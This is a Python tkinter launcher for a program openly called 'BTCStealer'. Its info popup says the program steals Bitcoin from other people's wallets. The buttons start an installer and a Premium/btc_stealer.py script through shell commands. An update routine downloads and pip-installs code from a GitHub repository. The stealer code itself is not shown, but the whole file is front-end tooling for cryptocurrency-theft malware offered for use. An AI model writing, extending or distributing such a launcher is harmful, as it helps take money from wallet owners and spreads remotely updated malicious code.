from tkinter import *
from subprocess import call
import os
from pathlib import *
import time
import requests
import pathlib

path = str(f"{pathlib.Path(__file__).parent.resolve()}")
version = 3
w = Tk()
print(path)
def informations():
    popup = Tk()
    popup.wm_title("BTCStealer")
    text = Label(popup, text="BTCStealer is a Bitcoin Stealer written in Python 3.7.\n\n"
             "It is a simple Bitcoin Stealer that can steal your Bitcoin from other Bitcoin Wallets.\n\n"
             "BTCStealer is written by LopeKinz"
             "Please Leave the Files inside a Folder named BTC.\n\n"
             )
    text.pack(side="top", fill="both", expand=True, padx=100, pady=100)
    b1 = Button(popup, text="Close", command=popup.destroy)
    b1.pack()
    popup.mainloop()

def update():
    """Get the newest version of a repo"""
    try:
        r = requests.get("https://raw.githubusercontent.com/LopeKinz/BTC/master/version.txt")
        if int(r.text) > version:
            """Update the Label checkupdate if a new version is available"""
            checkupdate.config(text="New Version Available! Update Now?", fg="green")
            if input("(Y/N)").lower() == "y":
                """Update the Label checkupdate if a new version is available"""
                os.system(f"start cmd /c cd {path} && pip install --upgrade  git+https://www.github.com/LopeKinz/BTC.git")
                """Update the Label checkupdate if a new version is available"""
                checkupdate.config(text="Update Complete!", fg="green")
                """Update the Label checkupdate if a new version is available"""
                exit()
        else:
            checkupdate.config(text="You are up to date!", fg="green")
    except:
        pass

def startapi():
    try:
        os.system(f"start cmd /c cd {path} && python Premium/btc_stealer.py")
    except:
        pass


def install():
    os.system(f"start cmd /c cd {path} && python Premium/installer.py")

w.geometry('500x200')

"""Create a button with a popup for informations"""


info = Button(w, text="Info", command=informations)
checkupdate = Label(w, text="Checking for Updates")
w.title("BTCStealer")
title1 = Label(w, text="BTCStealer")
title1.config(font=("Courier", 44))
install_requirements = Button(w, text="Install BTCStealer", command=install)
startapi_btn = Button(w, text = "Start BTCStealer", command=startapi)
update = Button(w, text="Check Update", command=update)
credit = Label(w, text="By Pinkyhax & Banhammer")
title1.pack()
install_requirements.pack()
startapi_btn.pack()
info.pack()
credit.pack()



w.mainloop()